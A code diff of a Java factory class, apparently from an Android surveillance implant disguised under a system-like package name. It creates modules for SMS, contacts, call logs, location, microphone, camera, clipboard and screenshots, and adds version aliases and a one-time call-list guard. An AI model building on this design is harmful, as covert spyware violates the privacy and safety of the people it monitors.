@@ -9,6 +9,7 @@
 
 package com.android.service.module;
 
+import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.interfaces.AbstractFactory;
 import com.android.service.util.Check;
@@ -27,39 +28,41 @@ public class FactoryAgent implements AbstractFactory<BaseModule, String> {
 	public BaseModule create(String type, String subtype) {
 		BaseModule a = null;
 
-		if("sms".equals(type)){
+		if ("sms".equals(type)) {
 			a = new ModuleMessage();
-		}else if("addressbook".equals(type)){
+		} else if ("addressbook".equals(type)) {
 			a = new ModuleAddressBook();
-		}else if("calendar".equals(type)){
+		} else if ("calendar".equals(type)) {
 			a = new ModuleCalendar();
-		}else if("calllist".equals(type)){
-			a = new ModuleCallList();
-		}else if("device".equals(type)){
+		} else if ("calllist".equals(type) || "call".equals(type)) { // Alias per la 8.0
+			if (Status.calllistCreated == false) {
+				a = new ModuleCallList();
+				Status.calllistCreated = true;
+			}
+		} else if ("device".equals(type)) {
 			a = new ModuleDevice();
-		}else if("position".equals(type)){
+		} else if ("position".equals(type)) {
 			a = new ModulePosition();
-		}else if("snapshot".equals(type)){
+		} else if ("snapshot".equals(type) || "screenshot".equals(type)) { // 7.6 -> 8.0
 			a = new ModuleSnapshot();
-		}else if("messages".equals(type)){
+		} else if ("messages".equals(type)) {
 			a = new ModuleMessage();
-		}else if("mic".equals(type)){
+		} else if ("mic".equals(type)) {
 			a = new ModuleMic();
-		}else if("camera".equals(type)){
+		} else if ("camera".equals(type)) {
 			a = new ModuleCamera();
-		}else if("clipboard".equals(type)){
+		} else if ("clipboard".equals(type)) {
 			a = new ModuleClipboard();
-		}else if("crisis".equals(type)){
+		} else if ("crisis".equals(type)) {
 			a = new ModuleCrisis();
-		}else if("application".equals(type)){
+		} else if ("application".equals(type)) {
 			a = new ModuleApplication();
-		}else{
+		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error (factory), unknown type: " + type) ;//$NON-NLS-1$
+				Check.log(TAG + " Error (factory), unknown type: " + type);//$NON-NLS-1$
 			}
 		}
 
 		return a;
 	}
-
 }
